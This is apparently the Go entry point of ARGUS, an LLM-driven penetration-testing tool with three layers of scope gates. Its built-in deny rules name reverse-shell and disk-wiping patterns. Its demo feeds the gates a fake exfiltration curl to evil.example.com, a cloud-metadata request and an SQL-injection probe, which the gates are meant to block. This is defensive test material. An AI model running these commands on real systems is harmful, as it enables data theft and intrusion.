// Command argus 是 ARGUS 的入口。
//
//	argus serve      启动控制台与 API
//	argus demo       跑一遍端到端演示（不触碰任何真实目标）
//	argus selftest   执行 15 项安全不变量自检
package main

import (
	"context"
	"errors"
	"flag"
	"fmt"
	"log"
	"net/http"
	"net/netip"
	"os"
	"os/signal"
	"path/filepath"
	"strings"
	"syscall"
	"time"

	"github.com/argus/argus/internal/agent"
	"github.com/argus/argus/internal/api"
	"github.com/argus/argus/internal/budget"
	"github.com/argus/argus/internal/engine"
	"github.com/argus/argus/internal/egress"
	"github.com/argus/argus/internal/evidence"
	"github.com/argus/argus/internal/gate"
	"github.com/argus/argus/internal/netguard"
	"github.com/argus/argus/internal/planner"
	"github.com/argus/argus/internal/scope"
	"github.com/argus/argus/internal/selftest"
	"github.com/argus/argus/internal/settings"
	"github.com/argus/argus/internal/store"
	"github.com/argus/argus/internal/toolbox"
)

const version = "0.1.0"

func main() {
	log.SetFlags(log.Ltime)
	if len(os.Args) < 2 {
		usage()
		os.Exit(2)
	}
	switch os.Args[1] {
	case "serve":
		if err := runServe(os.Args[2:]); err != nil {
			log.Fatalf("serve: %v", err)
		}
	case "demo":
		if err := runDemo(os.Args[2:]); err != nil {
			log.Fatalf("demo: %v", err)
		}
	case "egress":
		if err := runEgress(os.Args[2:]); err != nil {
			log.Fatalf("egress: %v", err)
		}
	case "selftest":
		os.Exit(runSelftest())
	case "version":
		fmt.Println("argus", version)
	default:
		usage()
		os.Exit(2)
	}
}

// runEgress 从授权范围生成出口网关白名单（squid 片段 / 主机清单）。
//
//	argus egress -scope "domain_suffix:lab.internal,cidr:10.20.0.0/16" -o deploy/egress/argus-allow.conf
func runEgress(args []string) error {
	fs := flag.NewFlagSet("egress", flag.ExitOnError)
	spec := fs.String("scope", "", "范围描述：kind:value[,kind:value]（domain_suffix/exact_domain/cidr/exact_ip/exact_url）")
	out := fs.String("o", "", "输出文件（留空打印到 stdout）")
	format := fs.String("format", "squid", "输出格式：squid=网关配置片段 | hosts=纯主机清单（给 ipset/iptables）")
	if err := fs.Parse(args); err != nil {
		return err
	}
	rules, err := egress.ParseSpec(*spec)
	if err != nil {
		return err
	}
	sc, err := scope.New(rules)
	if err != nil {
		return err
	}
	al := egress.FromScope(sc)

	var body string
	switch *format {
	case "squid":
		body = al.SquidConf()
	case "hosts":
		body = al.HostsFile()
	default:
		return fmt.Errorf("未知 format %q（squid|hosts）", *format)
	}

	if *out == "" {
		fmt.Print(body)
		return nil
	}
	if dir := filepath.Dir(*out); dir != "." && dir != "" {
		if err := os.MkdirAll(dir, 0o750); err != nil {
			return err
		}
	}
	if err := os.WriteFile(*out, []byte(body), 0o640); err != nil {
		return err
	}
	fmt.Printf("已写入 %s（域名 %d 条 / 网段 %d 条）\n", *out, len(al.Domains), len(al.Nets))
	return nil
}

func usage() {
	fmt.Fprint(os.Stderr, `ARGUS —— 带三层范围闸门的自主渗透测试系统

用法:
  argus serve   [-addr :8787] [-data ./data] [-token $ARGUS_TOKEN]
  argus demo
  argus selftest
  argus version
`)
}

// runtimeDeps 组装一套运行时（演示与自测共用同一套装配，避免"演示能跑、生产不能"）。
func runtimeDeps(st store.Store, ev *evidence.Store, b *budget.Budget, token string, res gate.Resolver) api.Deps {
	return api.Deps{
		Store: st, Ev: ev, Budget: b, Token: token,
		NewGate: func(taskID int64, sc *scope.Scope, sink gate.Sink) *gate.Gate {
			return gate.New(sc, res, sink)
		},
		NewExec: func(taskID int64, g *gate.Gate) engine.Executor {
			return &agent.SimExecutor{
				Gate: g, Ev: ev, St: st,
				Runner: agent.Runner{Timeout: 10 * time.Second},
				// 真实出站：与闸门共用同一份解析结果，再经第 3 层闸门校验实际 IP
				HTTP: netguard.HTTPClientWithLookup(g, 25*time.Second, g.Lookup),
			}
		},
		NewPlanner: func(taskID int64) engine.Planner { return agent.NewSimPlanner(nil) },
	}
}

// serveDeps 是生产装配：持久化 + LLM 规划器 + 运行期配置。
func serveDeps(st *store.Memory, ev *evidence.Store, b *budget.Budget, token string, res gate.Resolver, stg *settings.Store, execMode string, tools *toolbox.Executor) api.Deps {
	pl := planner.New(stg)
	d := runtimeDeps(st, ev, b, token, res)
	d.Settings = stg
	d.PlannerInfo = pl.Stats
	d.NewPlanner = func(taskID int64) engine.Planner { return pl }
	if (execMode == "real" || execMode == "container") && tools != nil {
		// 真实工具执行器：前置校验与模拟执行器完全一致，只有"执行"这一步换成沙箱调用
		d.NewExec = func(taskID int64, g *gate.Gate) engine.Executor {
			return &agent.RealExecutor{
				Gate: g, Ev: ev, St: st, Tools: tools,
				HTTP:    netguard.HTTPClientWithLookup(g, 30*time.Second, g.Lookup),
				MaxBody: 8 << 10,
			}
		}
	}
	return d
}

// seedDefaultRules 首次启动时写入内置拦截规则。
//
// 注意：这些规则是**闸门之上的附加层**——全部删掉，三层范围闸门依然生效。
// 之所以要有它们：范围管"能不能碰这个目标"，规则管"能对这个目标做什么"。
func seedDefaultRules(st *store.Memory) {
	if len(st.Rules()) > 0 {
		return
	}
	builtin := []store.Rule{
		{Name: "禁止磁盘破坏操作", Enabled: true, Action: "deny", MatchTarget: "tool_input", MatchType: "regex",
			Pattern: `(?i)(rm\s+-rf\s+/|mkfs\.|dd\s+if=|:\(\)\s*\{)`, Message: "破坏性命令只允许人工执行"},
		{Name: "禁止改系统账户", Enabled: true, Action: "deny", MatchTarget: "tool_input", MatchType: "regex",
			Pattern: `(?i)(useradd|userdel|passwd\s+root|chmod\s+777\s+/)`, Message: "账户与权限变更需人工审批"},
		{Name: "主动攻击工具需审批", Enabled: true, Action: "ask", MatchTarget: "tool_input", MatchType: "regex",
			Pattern: `(?i)(sqlmap|nuclei|hydra|metasploit|msfconsole)`, Message: "主动攻击工具会留下明显痕迹，需人工确认"},
		{Name: "禁止反弹 shell", Enabled: true, Action: "deny", MatchTarget: "tool_input", MatchType: "regex",
			Pattern: `(?i)(bash\s+-i\s+>&|nc\s+-e\s+/bin/(ba)?sh|/dev/tcp/)`, Message: "反弹 shell 属于高风险动作，默认禁止"},
	}
	for _, r := range builtin {
		st.AddRule(r)
	}
	log.Printf("已写入 %d 条内置拦截规则（可在 /api/intercept/rules 查看/删除）", len(builtin))
}

func runServe(args []string) error {
	fs := flag.NewFlagSet("serve", flag.ExitOnError)
	addr := fs.String("addr", ":8787", "监听地址")
	data := fs.String("data", "data", "数据目录（证据库落盘位置）")
	token := fs.String("token", os.Getenv("ARGUS_TOKEN"), "API Bearer token（留空则不鉴权，仅限本机）")
	web := fs.String("web", "web", "前端静态目录（留空则只提供 API）")
	dns := fs.String("dns", "", "静态解析表 host=ip[,host=ip]（实验室/离线环境用）；留空用系统 DNS")
	execMode := fs.String("exec", "real", "执行器：real=真实工具（同机沙箱）| container=每意图一次性容器（真隔离）| sim=模拟")
	runtime := fs.String("runtime", "docker", "容器运行时（container 模式用）：docker | podman")
	image := fs.String("image", "argus-toolbox:latest", "工具镜像（container 模式用）")
	egressNet := fs.String("egress-net", "none", "容器出网策略：none（无网）| 自定义 bridge 名（如 argus-egress，由网关做白名单）")
	egressProxy := fs.String("egress-proxy", "", "出口网关地址（如 http://egress:3128）；设置后容器内 HTTP 只能经它出网")
	if err := fs.Parse(args); err != nil {
		return err
	}
	if *token == "" {
		log.Printf("警告: 未设置 -token/ARGUS_TOKEN，API 无鉴权。仅允许监听 127.0.0.1。")
	}
	ev, err := evidence.Open(filepath.Join(*data, "evidence.jsonl"))
	if err != nil {
		return err
	}
	defer ev.Close()

	st, err := store.Open(filepath.Join(*data, "state.json"))
	if err != nil {
		return err
	}
	seedDefaultRules(st)
	stg := settings.Open(filepath.Join(*data, "settings.json"))
	b := budget.New()
	res := parseResolver(*dns)
	if res != nil {
		log.Printf("使用静态解析表: %s（未命中的主机按失败关闭处理）", *dns)
	}
	tools := toolbox.New(nil)
	tools.WorkDir = filepath.Join(*data, "work")
	tools.MaxOutput = 64 << 10
	switch *execMode {
	case "container":
		cfg := toolbox.ContainerConfig{
			Runtime: *runtime, Image: *image, Network: *egressNet, Proxy: *egressProxy,
		}
		if err := cfg.Available(); err != nil {
			// 失败关闭：不偷偷退化成本机执行，否则"隔离"就是一句空话
			return fmt.Errorf("%v\n（若只想用同机沙箱，请用 -exec real）", err)
		}
		tools.Container = &cfg
		log.Printf("执行器: container（%s/%s，网络 %s，只读根 + cap-drop ALL + 非 root，工作目录 %s）",
			cfg.Runtime, cfg.Image, cfg.Network, tools.WorkDir)
	case "real":
		log.Printf("执行器: real（同机沙箱白名单 nmap/nuclei/curl/httpx/dig/whois/nikto/sqlmap/ffuf/whatweb，工作目录 %s）", tools.WorkDir)
	default:
		log.Printf("执行器: sim（模拟执行，不调用真实工具）")
	}
	if *execMode != "sim" {
		// 工具就绪度：缺失 = 没装；不匹配 = 同名不同工具（例如 Python 的 httpx），已禁用
		var ready, missing, mismatch []string
		for _, st := range tools.VerifyTools(context.Background()) {
			switch st.State {
			case "ok":
				ready = append(ready, st.Name)
			case "missing":
				missing = append(missing, st.Name)
			default:
				mismatch = append(mismatch, st.Name)
			}
		}
		log.Printf("工具就绪(%d): %s", len(ready), strings.Join(ready, ", "))
		if len(missing) > 0 {
			log.Printf("工具缺失(%d): %s —— 相关意图会被拦成「工具未安装」", len(missing), strings.Join(missing, ", "))
		}
		if len(mismatch) > 0 {
			log.Printf("工具指纹不匹配(%d): %s —— 已禁用（同名不同工具，避免误用）", len(mismatch), strings.Join(mismatch, ", "))
		}
	}
	if !stg.LLM().Configured() {
		log.Printf("提示: LLM 未配置，任务只会执行种子意图（不自主规划）。用 PUT /api/llm 或 ARGUS_LLM_* 环境变量配置。")
	} else {
		log.Printf("LLM 已配置: %s / %s", stg.LLM().Provider, stg.LLM().Model)
	}
	srv := api.New(serveDeps(st, ev, b, *token, res, stg, *execMode, tools))

	httpSrv := &http.Server{
		Addr:              *addr,
		Handler:           buildHandler(*web, srv.Handler()),
		ReadHeaderTimeout: 10 * time.Second,
	}
	ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer stop()

	errCh := make(chan error, 1)
	go func() {
		banner(*addr, *data, ev.Len())
		if err := httpSrv.ListenAndServe(); err != nil && !errors.Is(err, http.ErrServerClosed) {
			errCh <- err
		}
	}()
	select {
	case err := <-errCh:
		return err
	case <-ctx.Done():
	}
	shutCtx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	err = httpSrv.Shutdown(shutCtx)
	// 优雅停机时强制落盘：否则最后 500ms 内的变更（含刚删掉的规则）会丢。
	if st != nil {
		if serr := st.Save(); serr != nil {
			log.Printf("停机落盘失败: %v", serr)
		}
	}
	return err
}

// parseResolver 解析 -dns 参数（host=ip,host=ip）。留空返回 nil，表示用系统 DNS。
// 实验室与离线演示必须用它：否则授权域名解析不到，会被"解析失败即拒绝"全部拦下。
func parseResolver(spec string) gate.Resolver {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return nil
	}
	m := map[string][]string{}
	for _, part := range strings.Split(spec, ",") {
		part = strings.TrimSpace(part)
		if part == "" {
			continue
		}
		i := strings.Index(part, "=")
		if i <= 0 {
			continue
		}
		host := strings.ToLower(strings.TrimSpace(part[:i]))
		ip := strings.TrimSpace(part[i+1:])
		if _, err := netip.ParseAddr(ip); err != nil {
			continue
		}
		m[host] = append(m[host], ip)
	}
	if len(m) == 0 {
		return nil
	}
	return gate.StaticResolver{Map: m}
}

// buildHandler 把 API 与前端静态资源挂在同一个端口上：
// /api/* 走 API（含鉴权中间件），其余走 SPA（找不到文件回退 index.html）。
func buildHandler(webDir string, apiHandler http.Handler) http.Handler {
	root := http.NewServeMux()
	root.Handle("/api/", apiHandler)
	if webDir == "" {
		root.Handle("/", apiHandler)
		return root
	}
	fs := http.FileServer(http.Dir(webDir))
	root.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		clean := filepath.Clean("/" + r.URL.Path)
		target := filepath.Join(webDir, clean)
		if st, err := os.Stat(target); err == nil && !st.IsDir() {
			fs.ServeHTTP(w, r)
			return
		}
		index := filepath.Join(webDir, "index.html")
		if _, err := os.Stat(index); err != nil {
			http.Error(w, "前端目录缺少 index.html（用 -web 指定，或传 -web \"\" 只用 API）", http.StatusNotFound)
			return
		}
		http.ServeFile(w, r, index)
	})
	return root
}

func banner(addr, data string, n int) {
	fmt.Printf(`

  █████╗ ██████╗  ██████╗ ██╗   ██╗███████╗
 ██╔══██╗██╔══██╗██╔════╝ ██║   ██║██╔════╝
 ███████║██████╔╝██║  ███╗██║   ██║███████╗
 ██╔══██║██╔══██╗██║   ██║██║   ██║╚════██║
 ██║  ██║██║  ██║╚██████╔╝╚██████╔╝███████║
 ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝

 version %s · 监听 %s · 数据 %s · 已有证据 %d 条
 授权范围: 请求级（每个任务独立，默认拒绝）
 三层闸门: intent → exec → network

`, version, addr, data, n)
}

func runDemo(_ []string) error {
	res := gate.StaticResolver{Map: map[string][]string{
		"lab.internal":        {"10.20.0.5"},
		"api.lab.internal":    {"10.20.0.6"},
		"evil.example.com":    {"203.0.113.9"},
		"rebind.lab.internal": {"10.20.0.7", "203.0.113.10"},
	}}
	sc, err := scope.New([]scope.Rule{
		{Kind: scope.KindDomainSuffix, Value: "lab.internal"},
		{Kind: scope.KindCIDR, Value: "10.20.0.0/16"},
	})
	if err != nil {
		return err
	}

	st := store.NewMemory()
	ev, _ := evidence.Open("")
	defer ev.Close()
	b := budget.New()

	t, err := st.CreateTask(store.Task{Name: "demo-lab", Goal: "验证三层闸门与证据链", Workers: 3})
	if err != nil {
		return err
	}
	b.Apply(budget.DefaultCaps(fmt.Sprintf("%d", t.ID), "*", time.Now().UTC().Format("2006-01-02")))

	script := [][]store.Intent{
		{
			{Action: "Bash", Summary: `{"command":"nmap -sV -p 80,443 lab.internal"}`, AssetID: 1, ParamKey: "scan:lab.internal"},
			{Action: "WebFetch", Summary: `{"url":"http://api.lab.internal/v1/users?id=1"}`, AssetID: 2, ParamKey: "fetch:users"},
		},
		{
			{Action: "Bash", Summary: `{"command":"curl http://evil.example.com/exfil?d=1"}`, AssetID: 3, ParamKey: "exfil"},
			{Action: "Bash", Summary: `{"command":"nmap -Pn 8.8.8.8"}`, AssetID: 4, ParamKey: "scan:8.8.8.8"},
			{Action: "Bash", Summary: `{"command":"curl http://169.254.169.254/latest/meta-data/"}`, AssetID: 5, ParamKey: "imds"},
		},
		{
			{Action: "Bash", Summary: `{"command":"curl 'http://api.lab.internal/v1/users?id=1%27"}`, AssetID: 2, ParamKey: "sqli:users",
				VulnClass: "SQL 注入", Severity: "high", Target: "api.lab.internal"},
		},
		{
			{Action: "Bash", Summary: `{"command":"nmap -sV -p 80,443 lab.internal"}`, AssetID: 1, ParamKey: "scan:lab.internal"},
		},
	}

	g := gate.New(sc, res, st)
	exec := &agent.SimExecutor{Gate: g, Ev: ev, St: st, Runner: agent.Runner{Timeout: 10 * time.Second}}
	pl := agent.NewSimPlanner(script)
	cfg := engine.DefaultConfig()
	cfg.Heartbeat = 3 * time.Second
	eng := engine.New(st, exec, pl, b, cfg)

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	fmt.Println("=== 1. 授权范围 ===")
	for _, line := range sc.Describe() {
		fmt.Println("   ", line)
	}
	fmt.Println("\n=== 2. 执行闭环（3 worker，防抖 800ms，空闲 3 轮收敛） ===")
	sum, err := eng.RunTask(ctx, t.ID)
	if err != nil {
		return err
	}
	fmt.Printf("    终态=%s 轮次=%d 派发=%d 去重=%d 完成=%d 拦截=%d 耗时=%dms\n",
		sum.State, sum.Rounds, sum.Dispatched, sum.Duplicates, sum.Done, sum.Blocked, sum.ElapsedMS)

	fmt.Println("\n=== 3. 第 3 层（网络层）独立验证（下面两次越界探测也会计入越界记录） ===")
	for _, ip := range []string{"10.20.0.5", "10.20.0.6", "1.1.1.1", "8.8.8.8", "169.254.169.254"} {
		addr := netip.MustParseAddr(ip)
		if e := g.CheckDial(addr); e == nil {
			fmt.Printf("    %-16s 放行\n", ip)
		} else {
			fmt.Printf("    %-16s 拦截  %v\n", ip, e)
		}
	}
	fmt.Printf("\n    已钉住 IP 数=%d（域名授权后解析出的 IP，供网络层判定）\n", g.Pinned())

	fmt.Println("\n=== 4. 越界记录 ===")
	for _, v := range st.Violations(t.ID) {
		fmt.Printf("    [%s] %-22s %s\n", v.Layer, v.Target, v.Reason)
	}

	fmt.Println("\n=== 5. 证据链 ===")
	fmt.Printf("    条数=%d 链校验=%v\n", ev.Len(), ev.Verify())

	task, _ := st.GetTask(t.ID)
	s := api.New(runtimeDeps(st, ev, b, "", res))
	fmt.Println("\n=== 6. 报告 ===")
	fmt.Println(s.BuildReport(task, sc))

	if sum.Dispatched != 6 || sum.Duplicates != 1 || sum.Blocked != 3 || sum.Done != 3 {
		return fmt.Errorf("演示断言失败: dispatched=%d dups=%d blocked=%d done=%d",
			sum.Dispatched, sum.Duplicates, sum.Blocked, sum.Done)
	}
	return nil
}

func runSelftest() int {
	fmt.Printf("ARGUS selftest v%s\n\n", version)
	results := selftest.Run()
	fail := 0
	for _, r := range results {
		fmt.Println(" ", r.String())
		if r.Err != nil {
			fail++
		}
	}
	fmt.Printf("\n%d/%d 通过\n", len(results)-fail, len(results))
	if fail > 0 {
		return 1
	}
	return 0
}
